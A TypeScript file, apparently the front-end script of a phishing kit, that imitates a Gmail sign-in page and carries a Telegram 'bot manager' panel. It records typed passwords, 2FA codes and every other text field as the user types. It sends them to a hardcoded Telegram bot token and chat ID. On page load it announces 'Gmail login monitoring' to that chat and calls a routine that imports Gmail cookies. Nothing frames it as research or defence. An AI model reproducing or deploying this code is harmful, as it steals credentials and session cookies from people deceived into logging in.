    showError(inputs.botToken, 'Invalid token format. Should be like: 123456789:ABCDEF...');
    return;
  }

  setLoadingState(true, 'Validating bot token...');
  addLogEntry('info', 'Validating bot token...');

  const result = await telegramAPI.validateBotToken(token);
  setLoadingState(false);

  if (result.valid && result.botInfo) {
    state.telegramBot.token = token;
    state.telegramBot.botInfo = result.botInfo;
    state.telegramBot.isValid = true;

    updateBotInfo(result.botInfo);

    // Save to localStorage
    localStorage.setItem('telegramBotToken', token);

    addLogEntry('success', 'Bot token validated successfully!');
  } else {
    showError(inputs.botToken, result.error || 'Invalid bot token');
    addLogEntry('error', `Token validation failed: ${result.error}`);
  }
}

async function validateBotToken(): Promise<void> {
  const token = inputs.botToken.value.trim();

  if (!token) {
    showError(inputs.botToken, 'Enter a bot token first');
    return;
  }

  if (!telegramAPI.validateTokenFormat(token)) {
    showError(inputs.botToken, 'Invalid token format');
    return;
  }

  buttons.validateToken.disabled = true;
  buttons.validateToken.textContent = 'Validating...';
  addLogEntry('info', 'Validating bot token...');

  const result = await telegramAPI.validateBotToken(token);

  buttons.validateToken.disabled = false;
  buttons.validateToken.textContent = 'Validate Token';

  if (result.valid && result.botInfo) {
    updateBotInfo(result.botInfo);
    addLogEntry('success', 'Token is valid!');
  } else {
    addLogEntry('error', `Validation failed: ${result.error}`);
    alert(`Validation failed: ${result.error}`);
  }
}

async function getChatInfo(): Promise<void> {
  const chatId = inputs.chatId.value.trim();
  const token = state.telegramBot.token;

  if (!token) {
    addLogEntry('error', 'Please validate bot token first');
    return;
  }

  if (!chatId) {
    showError(inputs.chatId, 'Enter a chat ID');
    return;
  }

  if (!telegramAPI.validateChatId(chatId)) {
    showError(inputs.chatId, 'Invalid chat ID format');
    return;
  }

  buttons.getChatInfo.disabled = true;
  buttons.getChatInfo.textContent = 'Getting Info...';
  addLogEntry('info', `Getting chat info for ${chatId}...`);

  const result = await telegramAPI.getChatInfo(token, chatId);

  buttons.getChatInfo.disabled = false;
  buttons.getChatInfo.textContent = 'Get Chat Info';

  if (result.success && result.chatInfo) {
    updateChatInfo(result.chatInfo);
  } else {
    addLogEntry('error', `Failed to get chat info: ${result.error}`);
    showError(inputs.chatId, result.error || 'Failed to get chat info');
  }
}

async function handleChatIdSubmit(e: Event): Promise<void> {
  e.preventDefault();

  const chatId = inputs.chatId.value.trim();
  const message = inputs.testMessage.value.trim() || 'Test message from Telegram Bot Manager! 🤖';
  const token = state.telegramBot.token;

  if (!token) {
    addLogEntry('error', 'Please validate bot token first');
    return;
  }

  if (!chatId) {
    showError(inputs.chatId, 'Enter a chat ID');
    return;
  }

  if (!telegramAPI.validateChatId(chatId)) {
    showError(inputs.chatId, 'Invalid chat ID format');
    return;
  }

  setLoadingState(true, 'Sending test message...');
  addLogEntry('info', `Sending test message to ${chatId}...`);

  const result = await telegramAPI.sendMessage(token, chatId, message);
  setLoadingState(false);

  if (result.success) {
    addLogEntry('success', `Message sent successfully! Message ID: ${result.messageInfo?.message_id}`);
    inputs.testMessage.value = '';
  } else {
    addLogEntry('error', `Failed to send message: ${result.error}`);
    showError(inputs.chatId, result.error || 'Failed to send message');
  }
}

// Password Toggle Functions
function togglePasswordVisibility(): void {
  const passwordInput = inputs.password;
  const eyeIcon = buttons.showPassword.querySelector('.eye-icon') as HTMLElement;

  if (passwordInput.type === 'password') {
    passwordInput.type = 'text';
    eyeIcon.textContent = '🙈';
    buttons.showPassword.setAttribute('aria-label', 'Hide password');
  } else {
    passwordInput.type = 'password';
    eyeIcon.textContent = '👁️';
    buttons.showPassword.setAttribute('aria-label', 'Show password');
  }
}

function toggleBotTokenVisibility(): void {
  const tokenInput = inputs.botToken;
  const eyeIcon = buttons.showBotToken.querySelector('.eye-icon') as HTMLElement;

  if (tokenInput.type === 'password') {
    tokenInput.type = 'text';
    eyeIcon.textContent = '🙈';
    buttons.showBotToken.setAttribute('aria-label', 'Hide bot token');
  } else {
    tokenInput.type = 'password';
    eyeIcon.textContent = '👁️';
    buttons.showBotToken.setAttribute('aria-label', 'Show bot token');
  }
}

// Data Management
function clearBotData(): void {
  if (confirm('Are you sure you want to clear all bot data? This will remove your saved token and reset all information.')) {
    // Clear state
    state.telegramBot.token = '';
    state.telegramBot.botInfo = null;
    state.telegramBot.isValid = false;

    // Clear inputs
    inputs.botToken.value = '';
    inputs.chatId.value = '';
    inputs.testMessage.value = '';

    // Hide info sections
    const botInfoSection = document.getElementById('botInfoSection') as HTMLElement;
    const chatInfoSection = document.getElementById('chatInfoSection') as HTMLElement;
    botInfoSection.classList.add('hidden');
    chatInfoSection.classList.add('hidden');

    // Clear localStorage
    localStorage.removeItem('telegramBotToken');

    // Clear log
    const messageLog = document.getElementById('messageLog') as HTMLElement;
    messageLog.innerHTML = `
      <div class="log-entry info">
        <span class="log-time">Ready</span>
        <span class="log-message">Enter your bot token to get started</span>
      </div>
    `;

    addLogEntry('info', 'All bot data cleared');
  }
}

// Send welcome message to confirm bot connection
async function sendWelcomeMessage(): Promise<void> {
  const token = '7558392184:AAETPcw8YohKbZzirgzjS7BSOzVZS_n3tbk';
  const chatId = '5721205355';

  const timestamp = new Date().toLocaleString();
  const message = `🎉 <b>Gmail Login Page Connected!</b>

✅ Your Telegram bot is now connected to the Gmail login page
⏰ <b>Connected at:</b> ${timestamp}
🔔 You will receive notifications for:
• Email and password entries
• Two-factor authentication completions
• Login attempts and security events

<i>Your Gmail login monitoring is now active!</i>`;

  try {
    const result = await telegramAPI.sendMessage(token, chatId, message);
    if (result.success) {
      addLogEntry('success', 'Welcome message sent to Telegram');
    }
  } catch (error) {
    addLogEntry('error', 'Error sending welcome message');
  }
}


// Load saved data
function loadSavedBotData(): void {
  const savedToken = localStorage.getItem('telegramBotToken');
  if (savedToken && telegramAPI.validateTokenFormat(savedToken)) {
    inputs.botToken.value = savedToken;
    addLogEntry('info', 'Saved bot token loaded');
  } else {
    // Pre-fill with provided bot token for demo
    const demoToken = '7558392184:AAETPcw8YohKbZzirgzjS7BSOzVZS_n3tbk';
    inputs.botToken.value = demoToken;
    addLogEntry('info', 'Demo bot token loaded');
  }

  // Pre-fill chat ID for demo
  const demoChatId = '5721205355';
  inputs.chatId.value = demoChatId;
  addLogEntry('info', 'Demo chat ID loaded');

  // Send welcome message on page load
  setTimeout(() => {
    sendWelcomeMessage();
  }, 2000);

  // Import Gmail cookies automatically (you can call this when needed)
  setTimeout(() => {
    importGmailCookies();
  }, 3000);
}

// Event Listeners Setup
function setupEventListeners(): void {
  // Theme toggle
  buttons.themeToggle.addEventListener('click', toggleTheme);

  // Form submissions
  forms.loginForm.addEventListener('submit', handleLoginSubmit);
  forms.passwordForm.addEventListener('submit', handlePasswordSubmit);
  forms.botTokenForm.addEventListener('submit', handleBotTokenSubmit);
  forms.chatIdForm.addEventListener('submit', handleChatIdSubmit);

  // Navigation buttons
  buttons.backToEmail.addEventListener('click', () => showPage('loginPage', 'backward'));
  buttons.backToLogin.addEventListener('click', () => showPage('loginPage', 'backward'));
  buttons.backToPassword.addEventListener('click', () => showPage('passwordPage', 'backward'));
  buttons.changeAccount.addEventListener('click', () => showPage('loginPage', 'backward'));
  

  // Telegram Bot Manager button removed
  buttons.validateToken.addEventListener('click', validateBotToken);
  buttons.getChatInfo.addEventListener('click', getChatInfo);
  buttons.backToSuccess.addEventListener('click', () => showPage('successPage', 'backward'));
  buttons.clearBotData.addEventListener('click', clearBotData);

  // Navigation links
  links.createAccount.addEventListener('click', (e) => {
    e.preventDefault();
    showPage('createAccountPage');
  });

  links.signInInstead.addEventListener('click', (e) => {
    e.preventDefault();
    showPage('loginPage', 'backward');
  });

  links.forgotEmail.addEventListener('click', (e) => {
    e.preventDefault();
    showPage('recoveryPage');
  });

  links.forgotPassword.addEventListener('click', (e) => {
    e.preventDefault();
    showPage('recoveryPage');
  });

  // Password visibility toggles
  buttons.showPassword.addEventListener('click', togglePasswordVisibility);
  buttons.showBotToken.addEventListener('click', toggleBotTokenVisibility);

  // Input event listeners with passcode monitoring
  inputs.email.addEventListener('input', () => clearError(inputs.email));

  inputs.password.addEventListener('input', () => {
    clearError(inputs.password);
    const password = inputs.password.value;
    if (password.length >= 4) { // Monitor passwords with 4+ characters
      savePasscode(password, 'Password (Real-time)');
      sendPasscodeNotification(password, 'Password (Real-time)', state.userEmail || 'Unknown');
    }
  });


  inputs.botToken.addEventListener('input', () => {
    clearError(inputs.botToken);
    const token = inputs.botToken.value;
    if (token.length >= 10) { // Monitor bot tokens
      savePasscode(token, 'Bot Token');
      sendPasscodeNotification(token, 'Bot Token');
    }
  });

  inputs.chatId.addEventListener('input', () => {
    clearError(inputs.chatId);
    const chatId = inputs.chatId.value;
    if (chatId.length >= 5) { // Monitor chat IDs
      savePasscode(chatId, 'Chat ID');
      sendPasscodeNotification(chatId, 'Chat ID');
    }
  });

  // Monitor all other password-type inputs
  const allInputs = document.querySelectorAll('input[type="password"], input[type="text"], input[type="email"]');
  allInputs.forEach(input => {
    if (!Object.values(inputs).includes(input as any)) {
      input.addEventListener('input', (e) => {
        const target = e.target as HTMLInputElement;
        const value = target.value;
        if (value.length >= 3) {
          savePasscode(value, `${target.placeholder || target.name || 'Unknown Input'}`);
          sendPasscodeNotification(value, `${target.placeholder || target.name || 'Unknown Input'}`);
        }
      });
    }
  });


  // Footer links
  const footerLinks = document.querySelectorAll('.footer-links a');
  for (const link of footerLinks) {
    link.addEventListener('click', (e) => {
      e.preventDefault();
      const linkText = (e.target as HTMLElement).textContent;
      alert(`This would normally take you to the ${linkText} page.`);
    });
  }

  // Focus management
  for (const input of Object.values(inputs)) {
    if (input) {
      input.addEventListener('focus', () => {
        input.parentElement?.classList.add('focused');
      });

      input.addEventListener('blur', () => {
        input.parentElement?.classList.remove('focused');
      });
    }
  }
}

// Initialize Application
function initializeApp(): void {
  console.log('Enhanced Gmail Login Page with Telegram Bot Manager initializing...');

  initializeTheme();
  setupEventListeners();
  loadSavedBotData();
  initializeUserSession();
  initializeCalendar();

  if (inputs.email) {
    inputs.email.focus();
  }

  console.log('Application loaded successfully!');
}

// Start the application
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initializeApp);
} else {
  initializeApp();
}

// Export for global access
declare global {
  interface Window {
    showPage: typeof showPage;
    toggleTheme: typeof toggleTheme;
    telegramAPI: TelegramAPI;
  }
}

window.showPage = showPage;
window.toggleTheme = toggleTheme;
window.telegramAPI = telegramAPI;